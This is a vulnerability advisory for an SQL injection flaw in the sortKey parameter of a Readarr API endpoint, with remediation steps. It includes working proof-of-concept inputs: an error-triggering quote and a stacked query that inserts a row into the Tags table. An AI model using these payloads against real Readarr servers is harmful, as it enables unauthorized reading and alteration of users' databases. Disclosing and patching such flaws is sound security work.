# CVE-2025-50983 Vulnerability Report

## Overview
- **CVE ID**: CVE-2025-50983
- **CWE**: CWE-89 (SQL Injection)
- **Affected Software**: Readarr 0.4.15.2787
- **Severity**: High (CVSS 8.3)

## Vulnerability Details

SQL Injection vulnerability exists in the `sortKey` parameter of the `GET /api/v1/wanted/cutoff` API endpoint. The endpoint fails to properly sanitize user-supplied input, allowing attackers to inject and execute arbitrary SQL commands against the backend SQLite database.

## Vulnerable Endpoint

```
GET /api/v1/wanted/cutoff?page=1&pageSize=20&sortDirection=descending&sortKey=<PAYLOAD>&monitored=true
```

## Proof of Concept

### 1. Error-based SQL Injection

Request:
```
sortKey=releaseDate'
```

Response:
```json
{
  "message": "SQL logic error\nno such column: Books.releaseDate'"
}
```

The SQLite error message is exposed, confirming unsanitized input.

### 2. Stacked Queries - Data Insertion

Request:
```
sortKey=releaseDate";INSERT INTO Tags(Label) VALUES('SQLI_PROOF')--
```

Result:
- Before injection: Tags table is empty `[]`
- After injection: Tags table contains `[{"label": "SQLI_PROOF", "id": 1}]`

This proves arbitrary SQL execution via stacked queries.

## Impact

- Execute arbitrary SQL commands on the database
- Extract, modify, or delete sensitive data
- Potential for privilege escalation
- Compromise data confidentiality and integrity

## Remediation

- Update to Readarr version 0.4.16.x or later
- Implement parameterized queries for sorting operations
- Apply input validation/whitelist on the sortKey parameter
